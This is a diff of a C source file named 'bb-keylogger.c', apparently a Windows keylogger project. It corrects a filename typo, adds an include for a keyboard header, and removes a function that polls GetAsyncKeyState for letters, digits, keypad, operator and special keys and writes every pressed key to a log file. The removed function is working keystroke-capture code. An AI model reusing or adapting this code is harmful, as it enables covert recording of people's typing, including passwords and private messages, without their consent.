@@ -16,7 +16,7 @@
 */
 
 /*
-* File:   bb-keyloger.c
+* File:   bb-keylogger.c
 * Author: Frapin Kevin
 * Date:   22/03/2011
 *
@@ -34,6 +34,7 @@
 
 //---------------------------------------------------------- PERSONNAL INCLUDES
 #include "includes/bb-keylogger.h"
+#include "includes/bb-keylogger-keyboard.h"
 #include "includes/global.h"
 
 //------------------------------------------------------------------- FUNCTIONS
@@ -58,85 +59,6 @@ void log_infos( FILE * log_file, const char * format, ... )
 	va_end( arg_ptr );
 }
 
-void log_keyboard_state( FILE * log_file )
-{
-	char * keyboard_state [ BUFFER_SIZE_KB_STATE ];
-	int success = GetKeyboardState( ( PBYTE ) keyboard_state );
-	if( success != 0 )
-	// If it succeeds
-	{
-		// State of the special keys for capital letter
-		int key_caps_lock = GetKeyState( VK_CAPITAL );// 0 or 1
-		int key_shift = GetAsyncKeyState( VK_SHIFT ); // 0 or KEY_DOWN_STATE
-		int is_cap = ( key_shift == KEY_DOWN_STATE ? 1 : 0 ) ^ key_caps_lock;
-		
-		// Check the state of the keys
-		// Alphabetic keys
-		int i;
-		for( i = VK_A; i <= VK_Z; i++ )
-		{
-			if( GetAsyncKeyState( i ) & KEY_PRESSED_STATE )
-			{
-				// Put the character in capital letter if necessary
-				int ascii = ( is_cap ? i : ( i+32 ) );
-				log_infos( log_file, "%c", ascii );
-			}
-		}
-		
-		// Numeric keys (can be special keys)
-		for( i = VK_0; i <= VK_9; i++ )
-		{
-			if( GetAsyncKeyState( i ) & KEY_PRESSED_STATE )
-			{
-				int scan_code = MapVirtualKey( i, 0 );
-				char ascii_char;
-				// ToAscii returns a numeric key [0..9] or a special key : [@,$,%,...]
-				if( ToAscii( i, scan_code, ( BYTE * ) keyboard_state, ( LPWORD ) &ascii_char, 0 ) == 1 )
-				// If a character has been retrieved
-				{
-					log_infos( log_file, "%c", ascii_char );
-				}
-			}
-		}
-		
-		// Numeric keys (keypad)
-		for( i = VK_NUMPAD0; i <= VK_NUMPAD9; i++ )
-		{
-			if( GetAsyncKeyState( i ) & KEY_PRESSED_STATE )
-			{
-				log_infos( log_file, "%01d", i - VK_NUMPAD0 );
-			}
-		}
-		
-		// Keys that alter the text stream
-		for( i = 0; i < NB_VKS_ALTER_STREAM; i++ )
-		{
-			if( GetAsyncKeyState( VKS_ALTER_STREAM[i] ) & KEY_PRESSED_STATE )
-			{
-				log_infos( log_file, "\n%s", VKS_ALTER_STREAM_TXT[i] );
-			}
-		}
-		
-		// Mathematical operators keys
-		for( i = 0; i < NB_VKS_MATH; i++ )
-		{
-			if( GetAsyncKeyState( VKS_MATH[i] ) & KEY_PRESSED_STATE )
-			{
-				log_infos( log_file, "%s", VKS_MATH_TXT[i] );
-			}
-		}
-		
-		// Others keys considered as importants
-		for( i = 0; i < NB_VKS_OTHERS; i++ )
-		{
-			if( GetAsyncKeyState( VKS_OTHERS[i] ) & KEY_PRESSED_STATE )
-			{
-				log_infos( log_file, "%s", VKS_OTHERS_TXT[i] );
-			}
-		}		
-		
-	}
-}
 
 void log_network_infos( FILE * log_file )
 {
